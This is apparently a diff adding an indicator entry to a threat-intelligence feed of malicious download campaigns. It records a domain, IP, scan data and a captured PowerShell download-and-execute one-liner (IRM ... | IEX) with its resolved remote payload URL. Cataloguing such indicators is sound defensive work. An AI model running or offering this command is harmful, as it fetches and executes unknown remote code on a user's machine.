@@ -1,5 +1,27 @@
 [
   {
+    "UrlDomain": "bastion-kansk.ru",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "185.9.147.250"
+    ],
+    "Related": [
+      {
+        "Value": "https://urshort.com/nsehzscux0r9",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmwmw4g2q1ulx0omljr4g3cvy",
+    "ScannedAt": "2026-11-19T01:47:35.719000+00:00"
+  },
+  {
     "UrlDomain": "purebrookkitchens.com",
     "DeliveryUrl": [
       "lskannsserv.beer",
